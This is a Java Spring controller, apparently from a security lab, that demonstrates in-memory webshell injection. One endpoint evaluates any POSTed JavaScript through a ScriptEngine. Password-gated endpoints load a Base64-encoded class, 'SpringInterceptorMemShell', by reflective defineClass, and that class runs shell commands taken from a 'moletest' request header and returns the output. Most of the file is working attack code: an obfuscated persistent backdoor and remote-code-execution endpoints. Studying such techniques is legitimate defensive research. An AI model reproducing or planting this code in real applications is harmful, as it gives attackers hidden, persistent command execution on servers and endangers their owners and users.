package me.mole.controller;

import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.lang.reflect.Method;
import java.util.Base64;

@RestController
@RequestMapping("/jsengine")
public class JSEngineController {

    @PostMapping("/testJsEngine")
    public String testJsEngine(String code) {

        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("js");

        if (engine == null) {
            System.out.println("No JavaScript engine found");
            return "No JavaScript engine found";
        }

        // 执行系统命令
        try {
            engine.eval(code);
        } catch (ScriptException e) {
            e.printStackTrace();
            return "testJsEngine failed";
        }

        return "testJsEngine ok!";
    }


    @PostMapping("/inject-memshell-hardcode")
    public String injectMemshellWithJavaHardcode(String pwd) {

        if ("inject".equals(pwd)) {
            String memshellClazzB64 = "yv66vgAAADQA3QoAMwByCgBzAHQIAHULAHYAdwcAeAcAeQsABQB6BwB7CABACgB8AH0KAH4AfwoAfgCABwCBBwCCBwCDCACEBwCFCACGCgARAIcKAA4AiAsADQCJBwCKCgAWAIsIAIwLAI0AjgsAjwCQCACRCACSCgCTAJQKAA8AlQgAlgoADwCXBwCYCACZCACaCgAhAJsIAJwIAJ0HAJ4KACEAnwoAoAChCgAnAKIIAKMKACcApAoAJwClCgAnAKYKACcApwoAqACpCgCoAKoKAKgApwcAqwcArAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAGGFkYXB0ZWRJbnRlcmNlcHRvcnNGaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABNhZGFwdGVkSW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEAEW1hcHBlZEludGVyY2VwdG9yAQA7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9NYXBwZWRJbnRlcmNlcHRvcjsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdGhpcwEAG0xTcHJpbmdJbnRlcmNlcHRvck1lbVNoZWxsOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47AQANU3RhY2tNYXBUYWJsZQcAhQcAigEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABmFueVN0cgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAVzY29kZQcAgwcArQcAmAcAngcArgcArwcAqwEACkV4Y2VwdGlvbnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAKU291cmNlRmlsZQEAHlNwcmluZ0ludGVyY2VwdG9yTWVtU2hlbGwuamF2YQwANQA2BwCwDACxALIBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHALMMALQAtQEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwAtgC3AQA+b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcHALgMALkAugcAuwwAvAC9DAC+AL8BAA5qYXZhL3V0aWwvTGlzdAEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9NYXBwZWRJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9TdHJpbmcBAAMvKioBABlTcHJpbmdJbnRlcmNlcHRvck1lbVNoZWxsAQADYWJjDAA1AE0MADUAwAwAwQDCAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAwwA2AQAIbW9sZXRlc3QHAK4MAMQAxQcArwwAxgDHAQAAAQAHb3MubmFtZQcAyAwAyQDFDADKAMsBAAN3aW4MAMwAzQEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAB2NtZC5leGUBAAIvYwwANQDOAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAM8A0AcA0QwA0gDTDAA1ANQBAAJcQQwA1QDWDADXANgMANkAywwA2gA2BwCtDADbAE0MANwANgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQBKKFtMamF2YS9sYW5nL1N0cmluZztMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9IYW5kbGVySW50ZXJjZXB0b3I7KVYBAANhZGQBABYoSUxqYXZhL2xhbmcvT2JqZWN0OylWAQAPcHJpbnRTdGFja1RyYWNlAQAJZ2V0SGVhZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoACEAEQAzAAEANAAAAAUAAQA1ADYAAQA3AAABJgAGAAYAAABkKrcAAbgAAhIDA7kABAMAwAAFTCsSBrkABwIAwAAGTRIIEgm2AApOLQS2AAstLLYADMAADToEuwAOWQS9AA9ZAxIQU7sAEVkSErcAE7cAFDoFGQQDGQW5ABUDAKcACEwrtgAXsQABAAQAWwBeABYABAA4AAAAMgAMAAAAFgAEABkAEwAbAB8AHgAnAB8ALAAgADYAIwBRACYAWwAsAF4AKgBfACsAYwAtADkAAABIAAcAEwBIADoAOwABAB8APAA8AD0AAgAnADQAPgA/AAMANgAlAEAAQQAEAFEACgBCAEMABQBfAAQARABFAAEAAABkAEYARwAAAEgAAAAMAAEANgAlAEAASQAEAEoAAAAQAAL/AF4AAQcASwABBwBMBAABADUATQACADcAAAA9AAEAAgAAAAUqtwABsQAAAAIAOAAAAAoAAgAAAC8ABAAxADkAAAAWAAIAAAAFAEYARwAAAAAABQBOAE8AAQBQAAAABQEATgAAAAEAUQBSAAMANwAAAboABgAJAAAArysSGLkAGQIAOgQZBMYAoSy5ABoBADoFEhs6BhIcuAAdtgAeEh+2ACCZACK7ACFZBr0AD1kDEiJTWQQSI1NZBRkEU7cAJDoHpwAfuwAhWQa9AA9ZAxIlU1kEEiZTWQUZBFO3ACQ6B7sAJ1kZB7YAKLYAKbcAKhIrtgAsOggZCLYALZkACxkItgAupwAFGQY6BhkItgAvGQUZBrYAMBkFtgAxGQW2ADKnAAU6BQOsBKwAAQAPAKYAqQAWAAMAOAAAAEYAEQAAADYACgA3AA8AOQAXADoAGwA8ACsAPQBKAD8AZgBBAHwAQgCQAEMAlQBEAJwARQChAEYApgBIAKkARwCrAEoArQBQADkAAABmAAoARwADAFMAVAAHABcAjwBVAFYABQAbAIsAVwBPAAYAZgBAAFMAVAAHAHwAKgBYAFkACAAAAK8ARgBHAAAAAACvAFoAWwABAAAArwBcAF0AAgAAAK8AXgBfAAMACgClAGAATwAEAEoAAAA5AAf+AEoHAGEHAGIHAGH8ABsHAGP8ACUHAGRBBwBh/wAaAAUHAEsHAGUHAGYHAGcHAGEAAQcATAEBAGgAAAAEAAEAFgBQAAAADQMAWgAAAFwAAABeAAAAAQBpAGoAAwA3AAAAUwAAAAUAAAABsQAAAAIAOAAAAAYAAQAAAFYAOQAAADQABQAAAAEARgBHAAAAAAABAFoAWwABAAAAAQBcAF0AAgAAAAEAXgBfAAMAAAABAGsAbAAEAGgAAAAEAAEAFgBQAAAAEQQAWgAAAFwAAABeAAAAawAAAAEAbQBuAAMANwAAAFMAAAAFAAAAAbEAAAACADgAAAAGAAEAAABbADkAAAA0AAUAAAABAEYARwAAAAAAAQBaAFsAAQAAAAEAXABdAAIAAAABAF4AXwADAAAAAQBvAEUABABoAAAABAABABYAUAAAABEEAFoAAABcAAAAXgAAAG8AAAABAHAAAAACAHE=";
            byte[] bs = Base64.getDecoder().decode(memshellClazzB64);
            try {
                Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClassMethod.setAccessible(true);
                Class clazz = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(),
                        bs, 0, bs.length);
                clazz.newInstance();
                return "inject done.";
            } catch (Exception e) {
                e.printStackTrace();
                return "inject failed!";
            }
        } else {
            return pwd;
        }
    }

    @PostMapping("/v2/inject-memshell-hardcode")
    public String injectMemshellWithJSHardcode(String pwd) {

        if ("inject".equals(pwd)) {
            try {
                ScriptEngineManager manager = new ScriptEngineManager();
                ScriptEngine engine = manager.getEngineByName("js");

                if (engine == null) {
                    System.out.println("No JavaScript engine found");
                    return "No JavaScript engine found";
                }

                String code = "var bs = java.util.Base64.getDecoder().decode('yv66vgAAADQA3QoAMwByCgBzAHQIAHULAHYAdwcAeAcAeQsABQB6BwB7CABACgB8AH0KAH4AfwoAfgCABwCBBwCCBwCDCACEBwCFCACGCgARAIcKAA4AiAsADQCJBwCKCgAWAIsIAIwLAI0AjgsAjwCQCACRCACSCgCTAJQKAA8AlQgAlgoADwCXBwCYCACZCACaCgAhAJsIAJwIAJ0HAJ4KACEAnwoAoAChCgAnAKIIAKMKACcApAoAJwClCgAnAKYKACcApwoAqACpCgCoAKoKAKgApwcAqwcArAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAGGFkYXB0ZWRJbnRlcmNlcHRvcnNGaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABNhZGFwdGVkSW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEAEW1hcHBlZEludGVyY2VwdG9yAQA7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9NYXBwZWRJbnRlcmNlcHRvcjsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdGhpcwEAG0xTcHJpbmdJbnRlcmNlcHRvck1lbVNoZWxsOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47AQANU3RhY2tNYXBUYWJsZQcAhQcAigEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABmFueVN0cgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAVzY29kZQcAgwcArQcAmAcAngcArgcArwcAqwEACkV4Y2VwdGlvbnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAKU291cmNlRmlsZQEAHlNwcmluZ0ludGVyY2VwdG9yTWVtU2hlbGwuamF2YQwANQA2BwCwDACxALIBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHALMMALQAtQEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwAtgC3AQA+b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcHALgMALkAugcAuwwAvAC9DAC+AL8BAA5qYXZhL3V0aWwvTGlzdAEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9NYXBwZWRJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9TdHJpbmcBAAMvKioBABlTcHJpbmdJbnRlcmNlcHRvck1lbVNoZWxsAQADYWJjDAA1AE0MADUAwAwAwQDCAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAwwA2AQAIbW9sZXRlc3QHAK4MAMQAxQcArwwAxgDHAQAAAQAHb3MubmFtZQcAyAwAyQDFDADKAMsBAAN3aW4MAMwAzQEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAB2NtZC5leGUBAAIvYwwANQDOAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAM8A0AcA0QwA0gDTDAA1ANQBAAJcQQwA1QDWDADXANgMANkAywwA2gA2BwCtDADbAE0MANwANgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQBKKFtMamF2YS9sYW5nL1N0cmluZztMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9IYW5kbGVySW50ZXJjZXB0b3I7KVYBAANhZGQBABYoSUxqYXZhL2xhbmcvT2JqZWN0OylWAQAPcHJpbnRTdGFja1RyYWNlAQAJZ2V0SGVhZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoACEAEQAzAAEANAAAAAUAAQA1ADYAAQA3AAABJgAGAAYAAABkKrcAAbgAAhIDA7kABAMAwAAFTCsSBrkABwIAwAAGTRIIEgm2AApOLQS2AAstLLYADMAADToEuwAOWQS9AA9ZAxIQU7sAEVkSErcAE7cAFDoFGQQDGQW5ABUDAKcACEwrtgAXsQABAAQAWwBeABYABAA4AAAAMgAMAAAAFgAEABkAEwAbAB8AHgAnAB8ALAAgADYAIwBRACYAWwAsAF4AKgBfACsAYwAtADkAAABIAAcAEwBIADoAOwABAB8APAA8AD0AAgAnADQAPgA/AAMANgAlAEAAQQAEAFEACgBCAEMABQBfAAQARABFAAEAAABkAEYARwAAAEgAAAAMAAEANgAlAEAASQAEAEoAAAAQAAL/AF4AAQcASwABBwBMBAABADUATQACADcAAAA9AAEAAgAAAAUqtwABsQAAAAIAOAAAAAoAAgAAAC8ABAAxADkAAAAWAAIAAAAFAEYARwAAAAAABQBOAE8AAQBQAAAABQEATgAAAAEAUQBSAAMANwAAAboABgAJAAAArysSGLkAGQIAOgQZBMYAoSy5ABoBADoFEhs6BhIcuAAdtgAeEh+2ACCZACK7ACFZBr0AD1kDEiJTWQQSI1NZBRkEU7cAJDoHpwAfuwAhWQa9AA9ZAxIlU1kEEiZTWQUZBFO3ACQ6B7sAJ1kZB7YAKLYAKbcAKhIrtgAsOggZCLYALZkACxkItgAupwAFGQY6BhkItgAvGQUZBrYAMBkFtgAxGQW2ADKnAAU6BQOsBKwAAQAPAKYAqQAWAAMAOAAAAEYAEQAAADYACgA3AA8AOQAXADoAGwA8ACsAPQBKAD8AZgBBAHwAQgCQAEMAlQBEAJwARQChAEYApgBIAKkARwCrAEoArQBQADkAAABmAAoARwADAFMAVAAHABcAjwBVAFYABQAbAIsAVwBPAAYAZgBAAFMAVAAHAHwAKgBYAFkACAAAAK8ARgBHAAAAAACvAFoAWwABAAAArwBcAF0AAgAAAK8AXgBfAAMACgClAGAATwAEAEoAAAA5AAf+AEoHAGEHAGIHAGH8ABsHAGP8ACUHAGRBBwBh/wAaAAUHAEsHAGUHAGYHAGcHAGEAAQcATAEBAGgAAAAEAAEAFgBQAAAADQMAWgAAAFwAAABeAAAAAQBpAGoAAwA3AAAAUwAAAAUAAAABsQAAAAIAOAAAAAYAAQAAAFYAOQAAADQABQAAAAEARgBHAAAAAAABAFoAWwABAAAAAQBcAF0AAgAAAAEAXgBfAAMAAAABAGsAbAAEAGgAAAAEAAEAFgBQAAAAEQQAWgAAAFwAAABeAAAAawAAAAEAbQBuAAMANwAAAFMAAAAFAAAAAbEAAAACADgAAAAGAAEAAABbADkAAAA0AAUAAAABAEYARwAAAAAAAQBaAFsAAQAAAAEAXABdAAIAAAABAF4AXwADAAAAAQBvAEUABABoAAAABAABABYAUAAAABEEAFoAAABcAAAAXgAAAG8AAAABAHAAAAACAHE=');" +
                        "var byteArr = Java.type('byte[]');" +
                        "var int = Java.type('int');" +
                        "var defineClazzMethod = java.lang.ClassLoader.class.getDeclaredMethod('defineClass',byteArr.class,int.class,int.class);" +
                        "defineClazzMethod.setAccessible(true);" +
                        "var clazz = defineClazzMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bs,0,bs.length);" +
                        "clazz.newInstance();";
                System.out.println("code=" + code);
                engine.eval(code);
                return "inject done.";
            } catch (Exception e) {
                e.printStackTrace();
                return "inject failed!";
            }
        } else {
            return pwd;
        }
    }

    @PostMapping("/inject-memshell")
    public String injectMemshell(String pwd, String code) {

        if ("inject".equals(pwd)) {
            try {
                ScriptEngineManager manager = new ScriptEngineManager();
                ScriptEngine engine = manager.getEngineByName("js");

                if (engine == null) {
                    System.out.println("No JavaScript engine found");
                    return "No JavaScript engine found";
                }

                engine.eval(code);
                return "inject done.";
            } catch (Exception e) {
                e.printStackTrace();
                return "inject failed!";
            }
        } else {
            return pwd;
        }
    }
}
